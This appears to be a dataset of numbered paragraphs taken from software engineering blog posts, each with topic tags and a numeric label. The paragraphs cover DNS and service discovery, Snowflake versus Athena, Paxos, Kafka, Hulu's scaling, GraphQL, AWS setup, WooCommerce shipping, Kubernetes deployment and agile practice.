2571,"Leveraging software-defined DNS tooling can provide some ease-of-use. When using public cloud, we still need to register a top-level domain like __url__ with some registrar. That can take a little bit of time to configured, since we need to add the public clouds name servers to the domains lookup. After that, registering a subdomain like __url__ and adding the load balancer reference can be done in a few minutes. Despite registration only taking a few minutes, keep in mind it will take time for the new DNS entries to propagate before our laptops can resolve the alias. The amount of time our laptops or applications cache the DNS entry (statically holding onto the previous entry for some time) can affect how long it takes before we can resolve to the new backend application instance or alias. For a case study of how DNS caching might affect an application, see my investigation into NGINX reverse proxy configuration and how its DNS cache creates some interesting side effects.","['DNS', 'Load Balancing', 'Service Discovery', 'Containers', 'Networking']",11
2572,"The first time I heard service discovery was actually in reference to container technology. The problem of attaching application instances to a load balancer and registering that to a DNS alias became a big pain point for container technology because containers are ephemeral. Their IP addresses can change at any moment. As a result, we needed a more dynamic way of addressing the process of service registration and resolution. Container orchestrators have various tools and techniques to accomplish highly dynamic service discovery, such as path-based routing and cluster-level DNS name servers. Both approaches combine the idea of DNS resolution and load balancing into a single tool.","['DNS', 'Load Balancing', 'Service Discovery', 'Containers', 'Networking']",11
2573,"A second technique for container service discovery is to create a small DNS name server scoped to the container orchestration cluster. This enables applications to resolve to each other with local DNS aliases. It is similar to creating a private DNS name server within an enterprise. For example, Kubernetes creates a small DNS name server that assigns a hostname to a set of application instances. Requests between applications in the cluster reference the name server as the resolution authority. If we want the application another to access helloworld, we simply code the configuration of another to call helloworld, which has a full DNS hostname of helloworld.default.svc.cluster.local. This is only available within the cluster itselfwe wont be able to get to it from outside of the cluster! After writing and re-reading all of this, I marvel at how complex the process of service discovery can be. I was always frustrated at why I couldnt get a DNS alias in minutes. Service discovery involves registration and resolution, accomplished by DNS and load balancing, respectively. There are many ways we can balance load, from physical appliances to dynamic container technologies, and many other ways we can resolve to a DNS alias.","['DNS', 'Load Balancing', 'Service Discovery', 'Containers', 'Networking']",11
2574,"In 1997, my first real software program was written in C/C++ as an intern for Compaq Computers. I vaguely recollect this being a very small piece of an accounting business program. What I clearly remember was being focused on learning the idiosyncrasies of these programming languages. I was getting my first taste of UNIX, Object Oriented Programming and modeling classes in UML (Universal Modeling Language). Learning the basics like when to use pass-by-value versus pass-by-reference, all without scanning Stack Overflow for answers. It was a really satisfying and rewarding experience to iterate and improve the software at a much faster pace compared to electrical construction.","['Tech', 'Careers', 'Software Development', 'Machine Learning', 'Data Science']",2
2575,"Back then, I had no idea that many of the languages and tools that provided me a great foundation for software engineering, would become irrelevant. As advancements in hardware loosely followed Moores Law, so too did the software we use and develop. At the turn of the century, Java and the JVM became my game changer. I no longer had to be OS-aware and be a memory management expert; instead, I simply had to include prebuilt packages that allowed for rapid software development. Soon after that, software virtualization of hardware became the norm as machines became more powerful, eventually leading to cloud computing today. Advancements in storage capacity enabled big data and analytics. User Interface (UI) frameworks exploded with the march of Java Script and libraries like j Query, in support of modern browsers. Smartphones and tablets with resizing touch screens paved the way for responsive UI technologies like bootstrap and backbone. Open source was becoming popular and now beginner programmers had a sea of languages, platforms, databases, frameworks, and tools to rapidly develop software applications. I cannot count the number of languages and technologies that I have used since the 1990s, many of which are now obsolete or on the decline. Today as a leader, my teams rarely use relational databases. Everything is No SQL, REST web-services are being replaced by Graph QL, in memory computing is common, and private data centers are being replaced by cloud technology. Recently we entered the age of Artificial Intelligence (AI) and Machine Learning (ML) which represents an entirely new world of opportunities.","['Tech', 'Careers', 'Software Development', 'Machine Learning', 'Data Science']",16
2576,"While having coffee with a new intern, he mentioned to me a crypto-coin-poker-game he was building in his spare time, where players bet online using currency from their own bitcoin wallets. It was born in the cloud, leveraging open-source cryptocurrency wallet technology, combined with gaming libraries. He had the basics up and running in a few weeks. I started to compare this to when I was an intern just some 20 plus years earlier, and the advancements in technology really sunk in. Rapid software development was a reality, even for an intern with limited software experience and little budget. I could not have had the money, hardware, or access to open source libraries to do the same in 1997. I can only imagine how different the software engineering landscape will look 20 years from now.","['Tech', 'Careers', 'Software Development', 'Machine Learning', 'Data Science']",16
2577,"On forums like Quora, you tend to see thousands of questions that all ask the same thing; Which programming language should I learn? Why do people keep asking this same question over and over again? A quick look on Quora shows you over 200K questions on the topic Programming Languages and some 1.2MM followers. People ask because they are seeking a path towards relevancy. They want career choices, respect, money and, equally important, a fun and supportive work environment that will nurture their growth. The programming language you choose to learn is the first foundational step in determining which career path to take. For example, searching for a software job in Cobol will lead you down a very different path than searching for one in Node Js. Regardless, learning how to program and how to adapt to this fast-changing environment will serve you better than becoming a language specialist.","['Tech', 'Careers', 'Software Development', 'Machine Learning', 'Data Science']",2
2578,"Following your passion will help you make the right decision. A data scientist might learn R and Python, while a web or Android developer would learn Java Script and Kotlin. Golang could emerge as the new C++ replacement. Languages with large communities and a huge ecosystem like Java Script, have a significantly lower barrier to entry than languages like Haskell or Rust. How will traditional software engineering change when quantum computers gain popularity? As you can see, the question of which programming language to learn is very subjective, with many applications and choices. Ultimately try and keep an open mind to learning something new.","['Tech', 'Careers', 'Software Development', 'Machine Learning', 'Data Science']",2
2579,"Practically, Java, Python or Java Script are good languages to start with because of the wide adoption. For example, if you choose to learn Java Script for UI development, a quick search online reveals that there are hundreds of Java Script web framework options. Many of these frameworks solve similar problems. With so many pre-packaged technology options to choose from, software is becoming less about writing code and more about leveraging different technologies that someone else already built for you. A new software program that used to take weeks to develop and deploy, now comes prepackaged and can be downloaded, configured and deployed within hours. Out of curiosity, I counted the number of technologies bundled on a typical backend micro-services and found it was over thirty.","['Tech', 'Careers', 'Software Development', 'Machine Learning', 'Data Science']",19
2580,"Cloud computing is changing the way we build software by making it accessible on a global scale. Simply put, cloud computing allows rapid software development by providing a catalog of paid, hosted hardware and software services via the internet. Before the cloud, most Saa S (Software as a Service) companies had teams that supported their data center operations, usually with a combination of network and system admin engineers. Hardware needed to be pre-ordered, racked, wired, deployed and maintained. I remember being in a startup in 2001 and having to drive thirty minutes to the collocated data center to make changes to physical serversso inefficient. Today engineers are shifting away from deploying and managing always available software on hardware, to deploying on-demand lightweight compute functions like Amazon lambdas. So no longer do you need to spend valuable time and energy building out infrastructure and writing code from scratch. Instead, engineers can focus more on designing and developing your software applications.","['Tech', 'Careers', 'Software Development', 'Machine Learning', 'Data Science']",16
2581,Both services follow a pay as you go model. You are only billed for the resources you use up. This pricing model for data analysis was pioneered by Google (Big Query) and Snowflake. Amazon then adopted the model and released AWS Athena in early 2017. It is now also implemented by Oracle for their autonomous data warehouse.,"['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2582,"Snowflake charges you for storage and compute. Pricing starts at $2 per hour (minimum of 1 minute billed; by the second thereafter. Pricing for regions and editions differs). With Athena you pay for storage and the amount of data that is scanned during a query. For Athena you are charged $5 per TB scanned with a minimum scanning of 10 MB ($0.00004768). In other words you are punished for running queries over small data sets. Google Big Query offers a similar price tag: $5 per Terabyte of scanned data. However, with Big Query you are charged for the raw/uncompressed data whereas for Athena you pay for the data (either compressed or in raw format depending on your scenario). Big Query gives you 1 TB for free and there is no minimum query charge. Assuming 5x compression, Google Big Query on the surface is 5 times more expensive than Athena.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2583,"Both Snowflake and Athena claim to follow a serverless model. In other words its a self managed service. Everything is taken care of for you. There are no knobs to tune or administer. Compare this to other data warehouse platforms. Just scrolling through the list of parameters you can set in Hive (a popular data warehouse on Hadoop) takes a few minutes With Snowflake there isnt really a single parameter you have to tune or any maintenance you have to perform. No vacuum (re-sorting your data), no distribution keys, no stats collection, no data redistribution, no upgrades. You dont need any DBAs either. There are no backups to manage as you are continously protected.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2584,"Lets have a look at Athena. Combined with AWS Glue, Athena is even able to auto-generate schemas for you. You can achieve something similar on Snowflake using Fivetran and similar tools. There arent too many knobs or parameters to set or tune. However, as Athena does not come with a cost based optimizer there is a good bit of manual effort required to get good performance for your SQL queries. We also need to write ETL to convert our data to Parquet or ORC and to create partitions etc. We discuss the limitations of this further down in the post.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2585,"Storage on Athena is immutable, which means that you cant update, upsert, or delete individual records. This may be considered as a huge limitation. However, as I have outlined in my article on dimensional modeling in the era of big data there are ways to work around this limitation. It just adds extra effort and overhead SQLBoth engines offer a mature set of SQL features. We see Snowflake slightly ahead, e.g. it offers User Defined Functions (UDF) and User Defined Aggregate Functions. We have a comparison of SQL support of various vendors on our website for download.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2586,"You scale Snowflake by selecting an instance type aka virtual warehouse. Instance types come in different sizes starting with XS and ranging to 4XL. The virtual warehouse represents the compute component of the platform. If you want to cut your execution time in half just double the size of your warehouse by the click of a button. You get stuff done 2x, 4x, 8x, 16x etc. faster and dont pay a cent more. Optionally you can set your warehouse to auto-scale and Snowflake automatically increases the warehouse size when there is increased demand on the platform.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2587,"You dont need to gather statistics in Athena either. It is hard to believe, but Athena does not come with a CBO. In this article on Athena best practices I have come across stuff like this: When you join two tables, specify the larger table on the left side of join and the smaller table on the right side of the join. Presto distributes the table on the right to worker nodes, and then streams the table on the left to do the join. If the table on the right is smaller, then there is less memory used and the query runs faster.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2588,"The other type of caching is result caching. Both Snowflake and Athena (to a much lesser degree) support it. For each query the result is physically set down to storage and if the same query is run again is satisfied from the cache. For Athena it is a manual process. Query results are stored in buckets on S3. Re-using the result set for another query requires us to create DDL against that table. We also need to point the query to it. In reality all this effort makes this feature unusable on Athena. However, if you just want to download the results of a query then this may help you.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2589,"Paradoxically, data loading is Athenas biggest weakness and in my opinion its ultimate downfall as a query service (nevermind a data warehouse). We have already learned that Athena is positioned as a query service with schema on read and a No ETL engine. In theory you just dump your data on S3 and query away. In practice it is more difficult. For efficient querying we want our data in Athena partitioned, bucketed, compressed, and in columnar format (Parquet or ORC). As per the Athena best practices guide you can achieve cost savings of 99%+ following these steps. So on the one hand you save a lot of money by applying these steps, but on the other all the nice benefits of schema on read and No ETL go out the window. You have to write a lot of code and run lengthy ETL pipelines. Sorry to burst the schema on read bubble. And did I tell you about optimal file sizes and the small files problem? Well, if your files are smaller than the blocksize (Athena documentation mentions 128 MB, which seems quite low) you will need to run some extra code to merge your files. The last problem you will encounter with schema on read and Athena is data quality. If your files do not fully conform to what you specify then querying will fail:-(.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2590,"Even though Snowflake is a schema on write engine it gets a lot closer to the No ETL ideal than Athena. Yes, in Snowflake you have to load your data and create a schema, but the platform takes care of everything else for you. You dont have to create partitions or buckets. You dont have to worry about ORC or Parquet, or compression. It is all done for you. Tools such as Fivetran or our own tool Flexter for XML and JSON also take care of target schema creation.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2591,"As we have seen, Athena does not compare favourably as a data warehouse platform to Snowflake. I think we can all agree on this point. As a matter of fact, AWS dont position it as a data warehouse. They market it as a query service for data on S3. It tightly integrates with the AWS Glue Catalog to detect and create schemas (DDL). In theory you should be able to query away to your hearts content. In practice however, you first need to convert your data to Parquet or ORC, partition, bucket, compress, adapt its file size etc. before you are ready to rock. And even then you better be careful with your queries. Its probably best to avoid joins of large tables altogether.","['Big Data', 'AWS', 'Athena', 'Snowflake']",8
2592,"If you are a distributed system veteran you must have already noticed one key word in the previous statement. I reviewed Time and Order before. Distributed system is all about ordering. future here implies ordering (happen-before relationship). So we have to order all proposals. Then in the example below, we can reject red because we know blue is chosen and red is an old proposal.","['Distributed Systems', 'Paxos']",1
2593,"In step 3 and 4, a proposer will change its proposal to the latest accepted proposal from acceptors it talked to. It seems to be very conservative because you might get an accepted proposal that is not chosen and the proposer ends up giving up his proposal. But that is OK since we only care about consensus. In the first phase, it is hard for the proposer to know if a value is chosen or not. An accepted value might not be chosen. But a chosen value must be accepted by a majority of the servers! And acceptors reject older proposals (step 6). With two invariants, we know that the latest accepted proposal returned to the proposal in phase one either has already been chosen, or no value has been chosen at the moment. Either way, it is safe to propose that value.","['Distributed Systems', 'Paxos']",1
2594,"Pinterest Kafka setup Figure 1 shows the Pinterest Kafka service setup. Currently we have Kafka in three regions of AWS. Most of the Kafka brokers are in the us-east-1 region. We have a smaller footprints in us-east-2 and eu-west-1. We use Mirror Maker to transport data among these three regions. In each region, we spread the brokers among multiple clusters for topic level isolation. With that, one cluster failure only affects a limited number of topics. We limit the maximum size of each cluster to 200 brokers.","['AWS', 'Engineering', 'Kafka Streams', 'Apache Kafka', 'Open Source']",6
2595,"Graph objects relate to one another through connections called edges. Depending on your requirements, a vertex could be linked to one or more objects through a series of edges. Its also possible to create a vertex without edges. Here are some basic graph configurations: As shown above, there are many ways to configure a graph. An additional option is to set the model to be either directed or undirected. The examples above represent undirected graphs. In other words, the connection between vertices A and B is equivalent to the connection between vertices B and A. Social networks are a great example of undirected graphs. Once a request is accepted, both parties (e.g. the sender and recipient) share a mutual connection.","['iOS App Development', 'Swift Programming', 'Algorithms', 'Interview Questions', 'Xcode']",14
2596,"The model gave us a confidence range with min, max, and mean range of predictions. As we got closer to the actual date, the confidence interval would get tighter, until we had a result that looked something like this: Scaling Our Platforms with a Hybrid Cloud Approach Most of Hulus services run on an internal Paa S we call Donki, which leverages Apache Mesos/Aurora in our data centers and a container orchestration system in the cloud. Donki packages services into containers and the same containers can run in our data centers and the cloud. Although we recently moved some of our highest traffic services to run in the cloud we were able to leverage our data centers in possible failover scenarios. Donki allows us to easily orchestrate deployments to either environment depending on the needs of a particular service. We focused on taking advantage of the auto scaling features in the cloud to better handle unexpected surges in traffic to keep our systems performing well.","['Hulu', 'Super Bowl', 'Streaming']",6
2597,"Our system has distinct architectural domains that needed to be scaled individually and as a whole. We started with stress testing to find weak points in these domains and the overall system. This led to a break / fix cycle as we solidified each domain of the system. Automated system wide tests ran multiple times a week. This allowed for the rapid iteration of verifying team fixes found in previous runs. Individual teams were also able to stress test their services in isolation to verify improvements prior to larger scale tests being run. Since all the services in the domains use Donki, our Paa S, fine tuning the size of each application cluster was easy. The effort could be then focused on application optimizations and tuning application cluster and scale parameters.","['Hulu', 'Super Bowl', 'Streaming']",10
2598,"Different domains scale in different ways. The Discovery Experience focuses on personalized, metadata-rich responses. This can be at odds when scaling up for millions of users. The goal is to give the best possible response for the user at that moment. We focus on caching baseline responses and then personalize on top of that to ensure viewers to find the content they want. We built graceful degradation into the system from the ground up. To achieve the scale that was needed in the system, we made these architectural design decisions.","['Hulu', 'Super Bowl', 'Streaming']",6
2599,"Use Asynchronous / Non-Blocking application framework Use the Circuit Breaker, Rate Limiting, and Load Shedding patterns Use both a local and distributed cache Cohesive Client behavior Our API gateway and edge services use a JVM-based asynchronous event-driven application framework and circuit breakers. This allows thousands of connections to be open against a single application instance at a time. If too many requests stay open too long, it can cause memory pressure. All applications have the point at which they become unresponsive. We used the stress and spike testing to fine tune rate limiting requests to the system to protect it from too much traffic. This allows the system to continue functioning and serve users during extreme spikes while it auto scales, rather than crumple under pressure and serve no one. In the event user traffic was beyond our rate limits, our system would begin to shed load. If requests needed to be shed, circuit breakers in our API layer would trip and send requests to the fallback cluster. This was a highly cached version of our core client application experience that supports requests for our unique users. The Discovery Experiences main goal is to return a response, this combination of patterns helps to ensure that.","['Hulu', 'Super Bowl', 'Streaming']",11
2600,"This brings us to the last point which is cohesive client behavior. Using defined and consistent server APIs, clients can help with scaling as well. Respecting HTTP response codes and headers, clients can help to prevent bombarding in error cases and generating more load in error scenarios. We have seen what inconsistent error handling logic in various clients can do in the past. Using strategies like exponential backoff and variable amount of time when calling the API are simple ways that clients can help to scale. This may seem like a reasonable approach, but it requires a coordinated effort with the numerous clients that we have. It also requires best practices on how early the API should be communicated.","['Hulu', 'Super Bowl', 'Streaming']",10
2601,"Computer science and software engineering go hand in hand, but you dont need to understand hundreds of advanced computer science topics to get a software development job (youll learn the most on the job anyway). Ive worked with plenty of engineers that came from backgrounds in economics, art, and writing, and they were no less an engineer than someone with a CS degree who can solve binary tree challenges in their sleep. I would argue though that you should have a good understanding of the following topics: Basic data structures/algorithms Git/version control Terminal/UNIX commands How a database and indexes work MVC concepts (back-end vs. front-end)Takeaway: Dont become overwhelmed with advanced computer science concepts. Its more important to build software and constantly be learning and challenging yourself. Dont think you need to read through an advanced computer architecture book or TAOCP to call yourself a real software engineer.","['Programming', 'Coding', 'Computer Science', 'Software Development', 'Software Engineering']",2
2602,"There is a Boardgame night every Wednesdays (Wednesday became my favorite day eversince). Everyone is really friendly and nice (this usually happens during board games if you know what I mean). Almost all people who I can talk with without any problems or hesitation I met during this board games night. Well, actually I think this is one of the main reasons I liked HDE: DNote: I know that this is not the only company that has board games night. But it is cool to have one for a small(kinda) company. And in large companies you usually play with other people not the ones you work with or see everyday.",['Japan'],0
2603,"However, RESTs principles dont consider the needs of Web and Mobile apps and their users. This is especially true in an optimized transaction like Checkout. Users want to complete their checkout as fast as possible. If your applications are consuming atomic REST APIs, youre often making many round trips from the client to the server to fetch data. With Checkout, weve found that every round trip costs at least 700ms in network time (at the 99th percentile), not counting the time processing the request on the server. Every round trip results in slower rendering time, more user frustration and lower Checkout conversion. Needless to say, round trips are evil! Sure, you can build an orchestration API to return all the data you need, but that comes with trade-offs. Now this seems like a JSON API, not a REST API. With orchestration APIs, your clients are coupled to your server. Any time you add a new feature or experiment, you add it to your API. Now youre overfetching, your performance suffers, and users pay the price.","['GraphQL', 'API', 'React', 'PayPal', 'Rest']",10
2604,"The Mobile SDK was only the beginning. Were now re-vamping our flagship Pay Pal Checkout products on top of Graph QL and React. If youre in the US, theres a good chance you are using our new stack. Graph QL is taking Pay Pal by storm too. A year later and we have over 30 apps/teams either building APIs or consuming APIs. Its not all sunshine and rainbows . Weve made some mistakes along the way that are worth sharing.","['GraphQL', 'API', 'React', 'PayPal', 'Rest']",6
2605,"Select the Cloud Front service from the AWS Management Console On the Cloud Front console, click Create Distribution Were going to create a web distribution, so under the section labeled Web select Get Started The next screen will have several sections. Under the section for Origin Settings, you need to enter your buckets endpoint URL (the one you copied earlier when enabling static hosting) as the Origin Domain Name You need to paste in your buckets endpoint URL as the Origin Domain Name Selecting from the drop-down list can lead to issues with Cloud Front redirecting to your buckets endpoint URL instead of forwarding. The Origin ID will be automatically populated for you after you enter your Origin Domain Name. You can leave the rest of the Origin on default values In the Default Cache Behaviour Settings select Redirect HTTP to HTTPS to ensure all users utilize secure connections. You can leave everything else in the Default Cache Behavior Settings at the default setting In the next section titled Distribution Settings, you need to enter your custom domain name. (This is the domain name that you purchased from your DNS Hosting Provider like Go Daddy, AWS Route 53)Make sure to list both the www prefixed domain name and the naked domain name Add an alternate domain name Scroll all the way to the bottom of the page to click Create Distribution After clicking on Create Distribution the distribution will be deployed in 15 minutes and is good to go Cloud Front intercepts requests and responses at Cloud Front edge locations. It means you may add intelligence in the CDN, without having to forward the request to the backend and losing benefits of content caching and geographical proximity with the client.","['AWS', 'Amazon', 'Ssl', 'Static Site', 'Cloudfront']",11
2606,"Im going to store the images with the key profile Pictures/ __url__ within the S3 bucket where the id concerned is the id of the user. The Auth Role and Unauth Role definitions within my IAM roles provide the user permissions. For example, here is my new Unauth Role: Within Serverless, we first of all need to define a function: This defines a Node JS 8.10 AWS Lambda function that will invoke the profile Picture Resolver function within the __url__ file. It also defines some environment variables for where the resource locations are and the IAM role that will be used: To test the facility, Im going to use the following function definition: This is a very simple function resolver that just returns constants, but it allows me to take a look at the event and context that is being passed in. Finally, lets take a look at the data source definition that I have placed in the custom.app Sync section of my __url__ file: This allows us to set up a test suite within the AWS App Sync console. First, navigate to the appropriate resolver definition: Log onto the AWS App Sync console.","['AWS', 'Aws Appsync', 'GraphQL']",7
2607,"You will see (once all the logs are expanded) something akin to this: The only real thing to note is this: nothing from the Graph QL context is passed into the Lambda context by default. It does not know about the identity of the calling user nor the source object, both of which are required for the functionality I want to provide. You need to specify what is passed in within the request mapping template. In this case, I need $context.source and $context.identity to be passed into the AWS Lambda function: If we run the test again, we see that the payload becomes the event argument within the Lambda function. We can now move on to our simple Lambda function that generates the appropriate data: Now, when we run the test, we get the following: Obviously, your data will be different. I can now do a PUT to the upload Url from my client using standard HTTP clients to upload a new picture. We can also use the same mechanism to generate a pre-signed URL for the get Object operation.","['AWS', 'Aws Appsync', 'GraphQL']",15
2608,"You might think that this is a great way to get the profile picture. It does, however, show off one problem that is an issue with Graph QL. Lets take an example query: This is a perfectly reasonable requestgive me the download URL of my profile picture. Now, how does that affect the context of the request? The $context.source is a blank object because we are not asking for any other fields. We arent requesting any other fields, so nothing is passed down to the resolver of the profile Picture field. That means $ __url__ does not exist, and the URL construction will fail.","['AWS', 'Aws Appsync', 'GraphQL']",14
2609,"Atom is one of my go-to applications and is becoming more and more useful everyday. Not only is Atom a 100% hackable text editor, its also a unique IDE. With it being open sourced, people have created thousands of packages to help maximize workflow and create a better working environment. No problem, just install autocomplete-python and let it finish your sentences. Find yourself using HTML, CSS, or Java Script? Theres a package for anything, and if there isnt, then you can make your own. Also, Atom just looks delightful and feels great to write in.","['Technology', 'Tech', 'Programming', 'Productivity', 'Self Improvement']",19
2610,"Rating: 9/10While One Note can feel like an actual notebook full of grand ideas, Simplenote is more like a stack of loose-leaf papers. Theres no tabs to rummage through, and there isnt a hierarchy at all. In fact, simplenote is just that, simple notes. There are notes to be made with very little formatting, no sections or subsections. Simplenote takes a more hands-off design philosophy by sitting you down in front of a blank page and letting you focus. There arent tabs and pages of features to explore, but a blank page to throw some ideas onto.","['Technology', 'Tech', 'Programming', 'Productivity', 'Self Improvement']",19
2611,"Woo Commerce has simplified E-commerce to a great extent. Today, almost anyone with a minimum technical know-how can have an online business store. It has never been easier to just set up an online store where you can sell your products and even ship it halfway across the world. However, this is 2018 and things arent going too well in terms of reducing human effort. Especially when it comes to shipping products globally. Even with an E-commerce platform like Woo Commerce, you still have to rely on the manual effort for tasks related to shipping.","['Ecommerce', 'Woocommerce', 'WordPress', 'Wordpress Plugins', 'Woocommerce Plugins']",17
2612,"Earlier, we talked about the importance of having faster delivery options. These delivery options alone are incomplete without the estimated delivery dates in a Woo Commerce shipping scenario. Afterall, who doesnt want to know when their product is getting delivered. Generally, customers get very excited when their package is about to deliver. Similarly, they also get easily irritated when the delivery takes longer. Hence, providing a delivery estimate can provide assurance to them. And let them have an idea of when they can expect the delivery.","['Ecommerce', 'Woocommerce', 'WordPress', 'Wordpress Plugins', 'Woocommerce Plugins']",1
2613,"Since we are clear about the aspects of Woo Commerce shipping which require automation, in this section, we will check out two Word Press plugins that will help automate Woo Commerce shipping for you. Both these plugins can fully automate the Woo Commerce shipping process right from the moment your customer places the order. These plugins are,This plugin is the #1 UPS shipping plugin that you can find online. This plugin provides support for Woo Commerce store owners who use UPS for shipping their products. UPS shipping plugin provides real-time shipping rates and also supports features like automatic product packing, generating shipping labels and shipment tracking. If you are using UPS as your shipping carrier, this plugin can help you automate your Woo Commerce shipping process and reduce the whole task to minutes.","['Ecommerce', 'Woocommerce', 'WordPress', 'Wordpress Plugins', 'Woocommerce Plugins']",6
2614,"As you can see in the image, the plugin will generate the shipping labels for the UPS 3 Day Select, for all your domestic deliveries.5.) Enable Automatic Package Generation Since we have already discussed the parcel packing method, you need to enable the plugin settings to automatically generate a package for your orders. This packages will contain all the products based on your parcel packing method. The plugin will generate a package as soon as the customers place the orders.6.) Enable Automatic Label Generation After selecting the default shipping service for your orders, the only thing you need to enable is the automatic shipping label generation. The plugin will automatically generate the shipping label once the customers place their orders. Just enable the option in the image below.7.) Send Tracking Details To The Customers Last but not the least, the plugin also makes sure your customers are able to track their packages. The plugin automatically generates the tracking details for every order. These details contain the shipping carriers name, the tracking number, and the shipment date. The plugin sends these details to the customers via the Order Confirmation Email. You can customize the tracking message based on your preferences.","['Ecommerce', 'Woocommerce', 'WordPress', 'Wordpress Plugins', 'Woocommerce Plugins']",7
2615,"You dont need to clone the git repository to make changes. You can do it from the __url__ website itself. After configuring the pipeline, you dont need to login to AWS. Everything happens automatically under the hood. You need one of your s3 buckets configured for static web hosting for this deployment. Read my story on s3 static website deployment and configure one if you dont have.","['AWS', 'Aws Codepipeline', 'Aws S3', 'Deployment', 'Sithum Devops']",7
2616,"This picture visualizes what I was trying to do: However, my demo failed. I ran a local Node (JS) application that would be invoked over HTTP from within the Oracle Databaseand that would publish to Twitter and Kafka. When I was working on the demo in my hotel room, it was all working just fine. I used ngrok to expose my locally running application on the public interneta great way to easily integrate local services in cloud-spanning demonstrations. It turned out that use of ngrok was not allowed by the network configuration at the Oracle Japan office where I did my presentation. There was no way I could get my laptop to create the tunnel to the ngrok service that would allow it to hand over the HTTP request from the Oracle Database.","['Docker', 'Nodejs', 'Kubernetes', 'Cloud']",11
2617,"When the Node application is running on Kubernetes it shall have a number of constituents:a namespace cqrs-demo to isolate the other artifacts in their own compartmenttwo secrets to provide the sensitive and dynamic, deployment specific details regarding Kafka and regarding the Twitter client credentialsa Pod for a single containerwith the Node applicationa Serviceto expose the Pod on an (externally) accessible endpoint and guide requests to the port exposed by the Poda Deployment http-to-twitter-appto configure the Pod through a template that is used for scaling and redeployment The separate namespace cqrs-demo is created with a simple kubectl command: The two secrets are two sets of sensitive data entries. Each entry has a key and a value and the value of course is the sensitive one. In the case of the application in this article I have ensured that only the secret-objects contain sensitive information. There is no password, endpoint, credential in any other artifact. So I can freely share the other fileseven on Git Hub.","['Docker', 'Nodejs', 'Kubernetes', 'Cloud']",7
2618,"The service is defined of type Load Balancer. This results on Oracle Kubernetes Engine on a special external IP address assigned to this service. That could be considered somewhat wasteful. A more elegant approach would be to use a Ingress Controllerthat allows us to handle more than just a single service on an external IP address. For the current example, Load Balancer will do. Note: when you run the Kubernetes artifacts on an environment that does not support Load Balancersuch as minikubeyou can change type Load Balancer to type Node Port. A random port is then assigned to the service and the service will be available on that port on the IP address of the K8S cluster.","['Docker', 'Nodejs', 'Kubernetes', 'Cloud']",11
2619,"After creating the service, it will take some time (up to a few minutes) before an external IP address is associated with the (load balancer for the) service. The external ip will then be shown as pending. Below what it looks like in the dashboard when the external IP has been assigned although I blurred most of the actual IP address)The deployment for now specifies just a single replica. It specifies the container image on which the container (instances) in this deployment are based: lucasjellema/http-to-twitter-app:0.9. This is of course the container image that I pushed in the previous section. The container exposes port 8080 (container port) and this port has been given the logical name app-api-port, that we have seen before.","['Docker', 'Nodejs', 'Kubernetes', 'Cloud']",11
2620,"Once the minimum information is organised, it will be essential to share this information with your team. In fact, it is not necessary for all details to be already definedthe team is supposed to help define certain flows and technologies. What you need to have ready is an explanation of the problem that needs to be solved and what solution options exist. In this meeting you will draw workflows, explain the limitations and work collaboratively with the team to come up with a solution. Most likely, you will remember something that was out of the radar, it could be both implementation-related and process-related. Some possible examples: We need to inform the marketing team that this feature can impact them We need to inform the Data team that they need to import some tables into Data Lake so we can measure the impact of this feature We need to align with other teams who are doing something similar We need to fix a technical debt since this blocks the implementation of this feature The solution presented here is very costly. We can narrow the scope at first and implement this way (explanation). In this way, we were able to deliver faster and measure the impact. If the results are positive, we will work to implement as initially suggested, but in an incremental approach.","['Agile', 'Methodology', 'Leadership', 'Scrum', 'Kanban']",1
2621,"It does not need to last longer than 15 to 30 minutes. After Story Mapping and Refining the team is already well aligned with the challenges ahead. The purpose of this meeting is to check if the next sprint team members are going to work, or if someone is going to have some day off or a vacation and there are holidays among other things that can impact a normal day of work. Given this, you can estimate how many points the team can deliver in the sprint. It is validation with the team and the PM / PO if they are all according to what needs to be developed and delivered in the next sprint. Do not forget to set the Sprint Goal or Goals. Depending on what needs to be delivered, sometimes the goal seems very obvious, however, what is obvious to you may not be obvious to everyone. So even though its repetitive, its important to speak out loud and align with everyone present at the meeting if everyone agrees with Sprints goal and whether it is achievable.","['Agile', 'Methodology', 'Leadership', 'Scrum', 'Kanban']",1
2622,"My understanding is that no one is happy all the time. We, humans, are not 100% happy, but we live a life with peaks of happiness. What I mean is that I can be happy in my work and at the same time I can have personal problems that make me worried or discouraged or even unhappy. Depending on the day this question is asked, the answer can vary greatly. Another problem related to the measurement of happiness is that it is often not possible to have a practical action for the team or manager of the person other than a friends talk or ask him to seek a specialized professional. Remember, agile methodologies are frameworks dedicated to continuous improvement that can be done to make a group of people work better and more efficiently and effectively. Of course, personal problems will interfere with the groups results, but its up to other specialties to help people with their personal problems in what they need. Be very careful in overcoming this barrier, you probably cannot be prepared to help in the best way possible.","['Agile', 'Methodology', 'Leadership', 'Scrum', 'Kanban']",4
2623,"Now that weve been provided with a starting template, lets think about how we want to define a successful integration test for our app. In my application, I want to ensure that all lint and unit tests are passing before a pull request is merged. Also, since this is a React Native application, I want to also ensure that the application is able to build on both Android and i OS. To build my React Native application, I use Fastlanea service that automates build and deployment processes for mobile applications. This tutorial will not cover how to setup Fastlane, however you can easily substitute these build steps based on the setup and requirements you have in your application. Now, lets starting adding some steps to our pipeline.","['Continuous Integration', 'React Native', 'Mobile', 'Azure', 'Android']",18
